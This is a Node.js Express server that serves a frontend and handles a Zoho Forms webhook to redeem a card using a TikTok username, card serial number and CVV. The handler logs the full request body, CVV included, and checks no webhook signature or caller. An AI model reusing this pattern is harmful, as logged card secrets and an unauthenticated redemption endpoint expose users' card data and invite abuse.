import express from "express";
import bodyParser from "body-parser";
import path from "path";
import { fileURLToPath } from "url";
import { redeemCard } from "./src/services/api"; // Changed extension to .js

// Get __dirname equivalent in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// ── Parse Zoho's urlencoded POSTs ─────────────────
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ── Serve frontend static files ──────────────────
app.use(express.static(path.join(__dirname, "dist")));

// ── Webhook handler ───────────────────────────────
app.post("/api/webhooks/zoho-forms", async (req, res) => {
  const { tiktokUsername, cardSerialNumber, cvv } = req.body;
  console.log("Received request:", req.body);
  try {
    // call your existing redeem logic
    const result = await redeemCard({
      data: { number: cardSerialNumber, cvv },
    });
    console.log("Redeem result:", result);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("Webhook handler error:", err);
    // return 200 so Zoho marks it "delivered"
    return res.status(200).json({ success: false, error: err.message });
  }
});

// ── Serve the frontend for all other routes ─────────
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

// ── Start server ──────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`⚡️ Server listening on port ${PORT}`));
